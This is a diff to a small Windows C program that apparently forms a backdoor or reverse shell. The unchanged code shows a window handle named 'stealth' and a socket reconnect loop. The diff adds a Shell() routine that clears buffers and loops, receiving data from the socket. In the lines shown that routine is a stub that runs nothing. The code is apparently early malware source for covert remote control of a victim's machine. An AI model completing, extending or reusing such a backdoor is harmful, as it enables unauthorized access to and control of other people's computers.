@@ -10,7 +10,24 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 
+#define bzero(p, size) (void) memset((p), 0, (size))
+
 int sock;
+
+void Shell() {
+	char buffer[1024];
+	char container[1024];
+	char total_response[18384];
+
+	while (1) {
+		jump:
+			bzero(buffer, sizeof(buffer));
+			bzero(container, sizeof(container));	
+			bzero(total_response, sizeof(total_response));
+
+			recv(sock, buffer, 1024, 0);
+	}
+}
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
 	HWND stealth;
@@ -44,3 +61,4 @@ start:
 		goto start;
 	}
 }
+
